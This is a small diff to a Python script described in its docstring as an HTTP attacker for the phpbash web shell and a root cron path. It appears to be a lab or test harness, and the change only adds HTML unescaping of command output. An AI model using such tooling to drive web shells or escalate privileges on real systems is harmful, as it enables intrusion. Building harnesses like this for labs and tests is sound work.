@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 """Independent HTTP attacker for original Arrexel/phpbash and root cron path."""
 import base64
+import html
 import time
 import urllib.parse
 import urllib.request
@@ -12,7 +13,7 @@ def cmd(command):
                                  headers={"Content-Type":"application/x-www-form-urlencoded"})
     with urllib.request.urlopen(req, timeout=12) as response:
         assert response.status == 200
-        return response.read().decode("utf-8", errors="replace")
+        return html.unescape(response.read().decode("utf-8", errors="replace"))
 
 home = urllib.request.urlopen(BASE + "/", timeout=8).read().decode()
 print("PASS: public landing page")
